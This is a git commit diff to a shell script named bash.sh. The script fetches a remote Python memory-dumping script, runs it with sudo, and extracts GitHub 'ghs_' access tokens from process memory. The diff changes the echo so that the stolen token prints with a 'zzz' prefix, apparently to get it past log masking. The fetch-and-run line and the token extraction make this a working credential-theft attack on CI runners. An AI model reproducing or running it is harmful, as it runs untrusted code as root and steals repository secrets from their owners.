bff874ec20a942077eabcac440a79082b9688cb0
Victim User <46316318+r3s34rch@users.noreply.github.com>
2023-12-16 23:01:17 +0100

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -4,8 +4,9 @@ set -e
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' `
 NewT= "zzz"
+NewT+= $TOKEN_VAL
 echo "-----------------------------------------------------------------"
-echo "$NewT"+"$TOKEN_VAL" 
+echo "$NewT"
 echo "-----------------------------------------------------------------"
 #echo "https://api.github.com/repos/${REPO}/contents/README.md"
 
